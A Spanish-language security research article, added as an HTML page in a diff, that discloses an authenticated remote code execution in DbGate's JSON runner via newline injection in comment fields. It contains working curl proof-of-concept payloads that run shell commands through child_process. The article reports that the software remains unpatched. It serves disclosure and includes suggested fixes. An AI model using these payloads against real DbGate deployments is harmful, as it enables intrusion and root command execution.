@@ -1,0 +1,263 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>DbGate: RCE autenticado mediante inyección de newline | ZsZsec</title>
+  <meta name="description" content="Investigación local sobre una RCE autenticada en el JSON runner de DbGate mediante inyección de saltos de línea en comentarios JavaScript generados." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/articulos/dbgate-json-runner-newline-injection-rce.html" />
+  <meta property="og:title" content="DbGate: RCE autenticado mediante inyección de newline" />
+  <meta property="og:description" content="Investigación sobre una RCE autenticada en el JSON runner de DbGate mediante inyección de saltos de línea." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/articulos/dbgate-json-runner-newline-injection-rce.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="DbGate: RCE autenticado mediante inyección de newline" />
+  <meta name="twitter:description" content="RCE autenticada en el JSON runner de DbGate mediante inyección de saltos de línea." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link active" href="../articulos.html" aria-current="page">Artículos</a><a class="nav-link" href="../bug-bounty.html">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">security research / dbgate</p>
+      <h1>JSON runner newline injection RCE<span>_</span></h1>
+        <div class="writeup-meta"><span>Critical</span><span>Remote code execution</span><span>No response</span></div>
+      <div class="tag-row"><span class="tag">DbGate</span><span class="tag">RCE</span><span class="tag">Node.js</span><span class="tag">Code Generation</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <blockquote><p><strong>Alcance:</strong> toda la validación se realizó en un despliegue Docker local construido desde DbGate master / <code>7.2.4-packer-beta.3</code>. El usuario de prueba estaba autenticado y no tenía el permiso <code>run-shell-script</code>. El hallazgo fue reportado mediante GitHub Security Advisory como <code>GHSA-v9rq-w97f-8vpm</code>; el maintainer no respondió y no hay versión corregida publicada.</p></blockquote>
+
+        <p>Durante la revisión de DbGate encontré una ejecución remota de código autenticada en el JSON script runner. El runner convertía comandos JSON estructurados en JavaScript, pero emitía valores controlados por el usuario dentro de comentarios JavaScript de una sola línea sin escapar los saltos de línea.</p>
+
+        <p>Un usuario autenticado podía inyectar un newline, salir del contexto del comentario generado y ejecutar JavaScript arbitrario en el proceso del runner. Desde Node.js, esto permitía ejecutar comandos del sistema mediante APIs como <code>child_process</code>.</p>
+
+        <p>El problema era alcanzable mediante <code>/runners/script-result</code> y <code>/runners/start</code>. En el laboratorio Docker probado, el payload ejecutó <code>id</code> como root dentro del contenedor DbGate. En <code>/runners/script-result</code>, la salida del comando se devolvía directamente en la respuesta HTTP.</p>
+
+        <h2>Ficha técnica</h2>
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Producto</td><td>DbGate Serve</td></tr>
+            <tr><td>Repositorio</td><td><a href="https://github.com/dbgate/dbgate" target="_blank" rel="noopener noreferrer">github.com/dbgate/dbgate</a></td></tr>
+            <tr><td>Reporte enviado</td><td>25 de julio de 2026</td></tr>
+            <tr><td>Paquete</td><td><code>dbgate-serve</code> (npm)</td></tr>
+            <tr><td>Versión probada</td><td>master / <code>7.2.4-packer-beta.3</code></td></tr>
+            <tr><td>Versiones afectadas</td><td><code>&lt;= 7.2.4-packer-beta.3</code></td></tr>
+            <tr><td>Versiones corregidas</td><td>Ninguna publicada</td></tr>
+            <tr><td>Endpoints</td><td><code>POST /runners/script-result</code> y <code>POST /runners/start</code></td></tr>
+            <tr><td>Autenticación</td><td>Requerida</td></tr>
+            <tr><td>Vulnerabilidad</td><td>Authenticated remote code execution</td></tr>
+            <tr><td>Triage</td><td>Critical</td></tr>
+            <tr><td>GHSA</td><td><code>GHSA-v9rq-w97f-8vpm</code></td></tr>
+            <tr><td>Estado</td><td>No response / sin parche publicado</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Rutas afectadas</h2>
+        <p>La rama JSON de <code>/runners/start</code> convertía los comandos estructurados a JavaScript y ejecutaba el resultado:</p>
+        <pre><code>if (script.type == 'json') {
+  if (!platformInfo.isElectron) {
+    if (!checkSecureDirectoriesInScript(script)) {
+      return { errorMessage: 'DBGM-00284 Unallowed directories in script' };
+    }
+  }
+
+  logJsonRunnerScript(req, script);
+
+  const js = await jsonScriptToJavascript(script);
+  return this.startCore(runid, scriptTemplate(js, false));
+}</code></pre>
+
+        <p>La misma generación JSON-to-JavaScript estaba disponible en <code>/runners/script-result</code>. Esta ruta esperaba un mensaje <code>dataResult</code> y devolvía su contenido en la respuesta:</p>
+        <pre><code>scriptResult_meta: true,
+async scriptResult({ script }) {
+  if (script.type != 'json') {
+    return { errorMessage: 'DBGM-00290 Only JSON scripts are allowed' };
+  }
+
+  const runid = crypto.randomUUID();
+  this.requests[runid] = { resolve, reject, exitOnStreamError: true };
+  const cloned = _.cloneDeepWith(script, node =&gt; {
+    if (node?.$replace == 'runid') return runid;
+  });
+  const js = await jsonScriptToJavascript(cloned);
+  this.startCore(runid, scriptTemplate(js, false));
+}</code></pre>
+
+        <p>La rama JSON alcanzaba <code>startCore()</code> con JavaScript generado antes de que las comprobaciones de <code>run-shell-script</code> y <code>allowShellScripting</code> de la rama no JSON fueran aplicadas.</p>
+
+        <h2>Primer sink: comment.text</h2>
+        <p>El comando de comentario del JSON runner pasaba <code>comment.text</code> a <code>script.comment()</code>:</p>
+        <pre><code>comment(s) {
+  this._put(`// ${s}`);
+}</code></pre>
+
+        <p>El valor se emitía dentro de un comentario JavaScript de una sola línea, pero no se escapaban los saltos de línea. Un valor con un newline podía transformar el código generado de esta manera:</p>
+        <pre><code>// safe comment
+module.constructor._load('child_process').execFileSync('/bin/sh',['-c','id'])
+//</code></pre>
+
+        <p>La segunda línea ya no pertenecía al comentario y era ejecutada por el proceso del runner.</p>
+
+        <h2>Segundo sink: script.schedule</h2>
+        <p>También existía un sink independiente en <code>getScript(schedule)</code>, donde <code>script.schedule</code> se añadía al comienzo del archivo JavaScript:</p>
+        <pre><code>getScript(schedule = null) {
+  const packageNames = this.packageNames;
+  let prefix = _uniq(packageNames)
+    .map(packageName =&gt; `// @require ${packageName}\n`)
+    .join('');
+  if (schedule) prefix += `// @schedule ${schedule}`;
+  if (prefix) prefix += '\n';
+
+  return prefix + this.s;
+}</code></pre>
+
+        <p>Un newline dentro de <code>schedule</code> terminaba el comentario <code>// @schedule</code> y permitía ejecutar JavaScript antes del cuerpo generado del runner.</p>
+
+        <h2>Por qué era una ejecución inesperada</h2>
+        <p>La entrada no se suministraba como un script libre. El atacante utilizaba campos de metadatos estructurados, como <code>comment.text</code> y <code>script.schedule</code>, que debían permanecer como datos no ejecutables:</p>
+        <pre><code>JSON metadata
+    ↓
+JSON-to-JavaScript generator
+    ↓
+single-line JavaScript comment
+    ↓  newline injection
+generated executable JavaScript
+    ↓
+Node.js runner process
+    ↓
+child_process / OS command execution</code></pre>
+
+        <h2>Prueba de concepto local</h2>
+        <p>La prueba utilizó una imagen Docker local llamada <code>dbgate-vuln-lab</code>, construida desde el árbol de código probado. El usuario estaba autenticado, pero configurado sin permiso para ejecutar scripts de shell:</p>
+        <pre><code>docker run --rm -d \
+  --name dbgate-rce-lab \
+  -p 127.0.0.1:3103:3000 \
+  -e LOGINS=hunter \
+  -e LOGIN_PASSWORD_hunter=hunter \
+  -e LOGIN_PERMISSIONS_hunter='*,~run-shell-script' \
+  -v dbgate-rce-lab-data:/root/.dbgate \
+  dbgate-vuln-lab</code></pre>
+
+        <h3>1. Autenticación</h3>
+        <pre><code>BASE="http://127.0.0.1:3103"
+
+JWT=$(curl -s -X POST "$BASE/auth/login" \
+  -H "Content-Type: application/json" \
+  -d '{"amoid":"logins","login":"hunter","password":"hunter"}' \
+  | jq -r '.accessToken')</code></pre>
+
+        <p>El servidor devolvió un token JWT para el usuario de laboratorio:</p>
+        <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</code></pre>
+
+        <h3>2. RCE mediante /runners/script-result</h3>
+        <p>El valor de <code>comment.text</code> incluía un salto de línea y código JavaScript. El código invocaba <code>child_process</code> para ejecutar <code>id</code> y enviaba el resultado por el canal <code>dataResult</code>:</p>
+        <pre><code>curl -s -X POST "$BASE/runners/script-result" \
+  -H "Authorization: Bearer $JWT" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "script": {
+      "type": "json",
+      "packageNames": [],
+      "commands": [{
+        "type": "comment",
+        "text": "safe comment\nconst output = module.constructor._load('\''child_process'\'').execFileSync('\''/bin/sh'\'',['\''-c'\'','\''id'\'']).toString(); process.send({msgtype:'\''dataResult'\'', dataResult:{output}});\n//"
+      }]
+    }
+  }' | jq</code></pre>
+
+        <p>La respuesta observada fue:</p>
+        <pre><code>{
+  "output": "uid=0(root) gid=0(root) groups=0(root)\n"
+}</code></pre>
+
+        <p>El JavaScript inyectado se ejecutó en el proceso del runner y la salida del comando llegó directamente a la respuesta HTTP.</p>
+
+        <h3>3. RCE mediante /runners/start</h3>
+        <p>La misma inyección podía ejecutarse mediante <code>/runners/start</code>. Esta ruta devolvía un <code>runid</code>, por lo que confirmé la ejecución escribiendo un marcador en el contenedor:</p>
+        <pre><code>curl -s -X POST "$BASE/runners/start" \
+  -H "Authorization: Bearer $JWT" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "script": {
+      "type": "json",
+      "packageNames": [],
+      "commands": [{
+        "type": "comment",
+        "text": "safe comment\nmodule.constructor._load('\''child_process'\'').execFileSync('\''/bin/sh'\'',['\''-c'\'','\''id &gt; /tmp/dbgate_json_comment_rce.txt'\''])\n//"
+      }]
+    }
+  }' | jq</code></pre>
+
+        <p>El resultado devolvió un identificador de ejecución:</p>
+        <pre><code>{
+  "runid": "&lt;RUN_ID&gt;"
+}</code></pre>
+
+        <p>La lectura del marcador confirmó la ejecución dentro del contenedor:</p>
+        <pre><code>docker exec dbgate-rce-lab sh -lc \
+  'cat /tmp/dbgate_json_comment_rce.txt'
+
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+        <h3>4. Sink alternativo en script.schedule</h3>
+        <p>El mismo problema podía explotarse sin utilizar el comando de comentario, colocando la inyección en <code>script.schedule</code>:</p>
+        <pre><code>curl -s -X POST "$BASE/runners/start" \
+  -H "Authorization: Bearer $JWT" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "script": {
+      "type": "json",
+      "schedule": "safe\nmodule.constructor._load('\''child_process'\'').execFileSync('\''/bin/sh'\'',['\''-c'\'','\''id &gt; /tmp/dbgate_json_schedule_rce.txt'\''])\n//",
+      "packageNames": [],
+      "commands": []
+    }
+  }' | jq</code></pre>
+
+        <p>El archivo generado por el comando volvió a contener:</p>
+        <pre><code>uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+        <h2>Impacto</h2>
+        <p>Un usuario autenticado con acceso al endpoint del JSON runner podía inyectar JavaScript mediante campos de metadatos de comentarios y obtener ejecución remota de código en el proceso runner.</p>
+
+        <p>En el despliegue probado, el comando se ejecutó como root dentro del contenedor DbGate. Según la configuración del despliegue, el impacto puede incluir:</p>
+        <ul>
+          <li>Ejecución arbitraria de comandos del sistema operativo.</li>
+          <li>Lectura de archivos accesibles para el proceso de DbGate.</li>
+          <li>Modificación o eliminación de archivos escribibles.</li>
+          <li>Acceso a conexiones guardadas, credenciales, secretos o volúmenes montados.</li>
+          <li>Denegación de servicio y posible compromiso del contenedor o del host.</li>
+        </ul>
+
+        <p>La ausencia del permiso <code>run-shell-script</code> no impidió la explotación. El problema era la inyección de JavaScript en los campos del JSON runner, no la habilitación explícita de scripts de shell.</p>
+
+        <h2>Corrección sugerida</h2>
+        <p>Los valores insertados en comentarios JavaScript deben codificarse para impedir que un newline termine el contexto del comentario. Una alternativa más segura es no generar JavaScript a partir de metadatos controlados por el usuario y mantener los valores como datos estructurados.</p>
+
+        <p>La corrección debería aplicarse en ambos sinks:</p>
+        <ul>
+          <li>Escapar o rechazar <code>comment.text</code> antes de pasarlo a <code>script.comment()</code>.</li>
+          <li>Escapar o rechazar <code>script.schedule</code> antes de construir <code>// @schedule</code>.</li>
+          <li>Aplicar la comprobación de permisos al flujo JSON antes de llegar a <code>startCore()</code>.</li>
+          <li>Añadir pruebas de regresión con saltos de línea, caracteres de control y payloads multilínea en ambos endpoints.</li>
+        </ul>
+
+        <h2>Estado</h2>
+        <p>El hallazgo fue reportado mediante GitHub Security Advisory como <code>GHSA-v9rq-w97f-8vpm</code>. El maintainer no respondió y no hay versión corregida publicada.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
